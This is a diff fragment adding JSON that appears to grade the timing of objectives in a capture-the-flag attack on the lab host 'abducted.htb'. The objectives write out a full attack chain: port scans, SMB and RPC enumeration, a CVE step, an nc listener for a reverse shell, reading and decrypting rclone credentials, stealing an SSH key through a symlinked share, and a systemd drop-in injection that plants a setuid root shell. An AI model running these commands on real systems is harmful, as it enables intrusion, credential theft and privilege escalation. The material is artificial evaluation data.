+        "objective": "nmap: nmap -p- --min-rate 10000 abducted.htb",
+        "verdict": "on_time",
+        "unlock_seq": 1,
+        "actual_seq": 1,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "nmap: nmap -p 22,139,445 -sCV abducted.htb",
+        "verdict": "on_time",
+        "unlock_seq": 2,
+        "actual_seq": 1,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "nmblookup: nmblookup -A abducted.htb",
+        "verdict": "on_time",
+        "unlock_seq": 3,
+        "actual_seq": 1,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "smbclient: smbclient -L //abducted.htb/ -N",
+        "verdict": "on_time",
+        "unlock_seq": 4,
+        "actual_seq": 4,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "rpcclient: rpcclient -N abducted.htb -U \"\" -c enumdomusers",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 1,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "rpcclient: rpcclient -N abducted.htb -U \"\" -c netshareenuma",
+        "verdict": "on_time",
+        "unlock_seq": 6,
+        "actual_seq": 1,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "echo (CVE-2026-4480)",
+        "verdict": "on_time",
+        "unlock_seq": 7,
+        "actual_seq": 7,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "nc: nc -lnvp 443",
+        "verdict": "on_time",
+        "unlock_seq": 8,
+        "actual_seq": 8,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "smbclient: smbclient //abducted.htb/HP-Reception -N -c 'pri",
+        "verdict": "late_pivot",
+        "unlock_seq": 9,
+        "actual_seq": 4,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "script: script /dev/null -c bash",
+        "verdict": "on_time",
+        "unlock_seq": 10,
+        "actual_seq": 9,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "id: id",
+        "verdict": "on_time",
+        "unlock_seq": 12,
+        "actual_seq": 12,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "cat: cat /etc/passwd | grep 'sh$'",
+        "verdict": "on_time",
+        "unlock_seq": 13,
+        "actual_seq": 13,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "ls: ls /opt/offsite-backup",
+        "verdict": "on_time",
+        "unlock_seq": 14,
+        "actual_seq": 14,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "cat: cat /opt/offsite-backup/rclone.conf",
+        "verdict": "on_time",
+        "unlock_seq": 15,
+        "actual_seq": 14,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "rclone: rclone reveal [redacted]",
+        "verdict": "on_time",
+        "unlock_seq": 16,
+        "actual_seq": 14,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "su: su - scott",
+        "verdict": "on_time",
+        "unlock_seq": 17,
+        "actual_seq": 14,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "cat: cat user.txt",
+        "verdict": "on_time",
+        "unlock_seq": 18,
+        "actual_seq": 18,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "cat: cat /etc/samba/shares.conf",
+        "verdict": "on_time",
+        "unlock_seq": 19,
+        "actual_seq": 19,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "ln: ln -s /home/marcus /srv/transfer/marcus-link",
+        "verdict": "late_pivot",
+        "unlock_seq": 20,
+        "actual_seq": 13,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "smbclient: smbclient //abducted.htb/transfer -U scott%[reda",
+        "verdict": "late_pivot",
+        "unlock_seq": 21,
+        "actual_seq": 4,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "ssh: ssh -o IdentityFile=./id_ed25519 marcus@abducted",
+        "verdict": "on_time",
+        "unlock_seq": 22,
+        "actual_seq": 16,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "id: id",
+        "verdict": "on_time",
+        "unlock_seq": 23,
+        "actual_seq": 23,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "ls: ls -ld /etc/systemd/system/smbd.service.d/",
+        "verdict": "on_time",
+        "unlock_seq": 24,
+        "actual_seq": 23,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "echo: echo -e '[Service]\\nExecStartPre=-/bin/bash -c \"",
+        "verdict": "late_pivot",
+        "unlock_seq": 25,
+        "actual_seq": 7,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "systemctl: systemctl daemon-reload",
+        "verdict": "on_time",
+        "unlock_seq": 26,
+        "actual_seq": 26,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "systemctl: systemctl restart smbd",
+        "verdict": "late_pivot",
+        "unlock_seq": 27,
+        "actual_seq": 25,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": ".rootbash: /tmp/.rootbash -p",
+        "verdict": "on_time",
+        "unlock_seq": 28,
+        "actual_seq": 25,
+        "lag_ms": 0,
+        "note": ""
+      },
+      {
+        "objective": "cat: cat root.txt",
+        "verdict": "late_pivot",
+        "unlock_seq": 30,
+        "actual_seq": 18,
+        "lag_ms": 0,
+        "note": ""
+      }
+    ]
+  },
+  "lesson": null
+}
